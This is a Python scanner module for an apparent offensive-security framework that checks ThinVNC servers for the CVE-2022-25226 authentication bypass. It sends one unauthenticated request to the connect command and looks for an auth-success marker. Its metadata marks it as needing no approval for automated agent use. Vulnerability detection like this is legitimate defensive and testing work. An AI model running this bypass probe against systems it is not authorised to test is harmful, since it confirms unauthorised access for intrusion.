#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ThinVNC version 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ThinVNC - Authentication Bypass Detection',
        'description': 'ThinVNC version 1.0b1 allows an unauthenticated user to bypass the authentication process via a specific command, potentially leading to unauthorized access and code execution.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'thinvnc', 'auth-bypass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'cve': 'CVE-2022-25226',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cmd?cmd=connect', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('cmd":"connectStatus', 'authStatus":1',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="ThinVNC - Authentication Bypass detected",
                path='/cmd?cmd=connect',
            )
            return True
        return False

